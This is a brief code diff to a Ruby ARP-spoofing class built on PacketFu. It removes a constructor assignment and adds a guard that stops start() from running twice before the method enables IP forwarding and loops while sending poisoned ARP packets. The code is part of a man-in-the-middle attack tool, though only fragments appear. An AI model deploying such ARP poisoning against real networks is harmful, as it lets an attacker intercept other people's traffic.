@@ -39,7 +39,6 @@ class ARPSpoof
         @victim_packet = PacketFu::ARPPacket.new
         @router_packet = PacketFu::ARPPacket.new
         @interface = iface
-        @running = spoof
 
         @victim_packet.eth_saddr = cfg[:eth_saddr]
         @victim_packet.eth_daddr = victim_mac
@@ -88,6 +87,10 @@ class ARPSpoof
     # Notes:
     #---------------------------------------------------------------------------
     def start
+        if @running then
+            puts "Already running ARP Poisoning"
+            return
+        end
         # Enable IP forwarding
         `echo 1 > /proc/sys/net/ipv4/ip_forward`
         while(@running)
